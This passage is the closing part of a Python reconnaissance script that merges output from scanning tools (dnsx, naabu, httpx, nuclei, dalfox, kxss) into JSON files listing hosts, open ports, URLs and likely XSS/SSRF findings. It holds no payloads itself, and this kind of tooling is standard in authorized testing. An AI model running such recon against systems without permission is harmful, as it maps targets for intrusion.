            "favirecon": str(favirecon_file),
            "csprecon": str(csprecon_file),
            "grep_ndjson": str(grep_ndjson),
            "grep_summary": str(grep_summary),
            "ssrf_candidates": str(ssrf_ndjson),
            "ssrf_params": str(ssrf_params_txt),
            "extintel_dir": str(extintel_dir),
        }
        unified["counts"] = {"subs": len(read_lines(subs_file)), "urls": len(read_lines(urls_file)),
                             "js_endpoints": len(read_lines(js_file)), "alive_roots": len(read_lines(alive_roots_file))}
        with open(intel_json, "w", encoding="utf-8") as f: json.dump(unified, f, indent=2)
        console.print(f"[green]Unified JSON saved →[/] {intel_json}")

        # Normalized intel
        normalized = {"domain": domain, "hosts": [], "urls": [], "vulns": []}
        # hosts from dnsx + naabu
        host_ips = {}
        for line in read_lines(dnsx_file):
            try:
                j = json.loads(line); host = j.get("host") or j.get("fqdn") or j.get("input") or j.get("name")
                ips = j.get("a") or j.get("ip") or j.get("answer")
                if host:
                    if isinstance(ips, list): host_ips.setdefault(host, set()).update([ip for ip in ips if isinstance(ip,str)])
                    elif isinstance(ips,str): host_ips.setdefault(host, set()).add(ips)
            except Exception: pass
        host_ports = {}
        for line in read_lines(naabu_json_file):
            try:
                j = json.loads(line); host = j.get("host") or j.get("ip"); port = j.get("port"); service = j.get("service")
                if host and port: host_ports.setdefault(host, []).append({"port": int(port), "service": service})
            except Exception: pass
        # urls from httpx
        for line in read_lines(httpx_json_file):
            try:
                j = json.loads(line)
                normalized["urls"].append({"url": j.get("url"), "status": j.get("status_code"), "title": j.get("title"),
                                           "content_length": j.get("content_length"), "tech": j.get("tech", []),
                                           "webserver": j.get("webserver"), "ip": j.get("ip"), "cdn": j.get("cdn")})
            except Exception: pass
        for h in sorted(set(list(host_ips.keys()) + list(host_ports.keys()))):
            normalized["hosts"].append({"host": h, "ips": sorted(list(host_ips.get(h, []))), "open_ports": sorted(host_ports.get(h, []), key=lambda x: x["port"])})
        # vulns from nuclei, dalfox, kxss
        nuclei_jsonl = scan_dir / "nuclei.jsonl"
        for line in read_lines(nuclei_jsonl):
            try:
                j = json.loads(line)
                normalized["vulns"].append({"template": j.get("template"), "severity": j.get("severity"),
                                            "matched_at": j.get("matched-at") or j.get("matched_at"), "host": j.get("host"),
                                            "type": "nuclei"})
            except Exception: pass
        for line in read_lines(scan_dir / "dalfox.txt"):
            normalized["vulns"].append({"type": "dalfox", "raw": line})
        for line in read_lines(scan_dir / "kxss.txt"):
            normalized["vulns"].append({"type": "kxss", "raw": line})

        intel_normalized = target_dir / "intel_normalized.json"
        with open(intel_normalized, "w", encoding="utf-8") as f: json.dump(normalized, f, indent=2)
        console.print(f"[green]Normalized JSON saved →[/] {intel_normalized}")

        if args.ndjson:
            for name, arr in [("urls", normalized["urls"]), ("vulns", normalized["vulns"]), ("hosts", normalized["hosts"])]:
                with (target_dir / f"{name}.ndjson").open("w", encoding="utf-8") as f:
                    for it in arr: f.write(json.dumps(it) + "\n")
            console.print(f"[green]NDJSON[/] urls.ndjson vulns.ndjson hosts.ndjson")

        if domain_dir:
            (Path(domain_dir) / "summary.txt").write_text(f"[{datetime.utcnow().isoformat()}Z] Run {target_dir.name}\n{json.dumps(unified['counts'])}\n")
            (Path(domain_dir) / f"{domain}_subdomains.txt").write_text("\n".join(read_lines(subs_file)))
            (Path(domain_dir) / f"{domain}_subdom_details.txt").write_text("\n".join(read_lines(alive_roots_file)))

        console.rule("[bold]Summary[/]")
        t = Table(box=box.SIMPLE, title="Artifacts", show_lines=True); t.add_column("File/Dir"); t.add_column("Count", justify="right")
        for label, pth in [("subs.txt", subs_file), ("alive_roots.txt", alive_roots_file), ("urls.txt", urls_file), ("js.txt", js_file)]:
            t.add_row(label, str(len(read_lines(pth))))
        console.print(t)
        if live:
            try:
                live.stop()
            except Exception:
                pass

        console.print(f"\n[bold green]Done.[/] Total time: {int(time.time()-start)}s  →  {target_dir}")

    except KeyboardInterrupt:
        console.print("[red]Aborted by user.[/]")
    except Exception as e:
        console.print(f"[red]Unhandled error:[/] {e}")
        raise

if __name__ == "__main__":
    args = parse_args()
    if args.max_time > 0:
        try: asyncio.run(asyncio.wait_for(main(), timeout=args.max_time))
        except asyncio.TimeoutError: print("Global timeout reached. Exiting.", file=sys.stderr); sys.exit(2)
    else:
        asyncio.run(main())
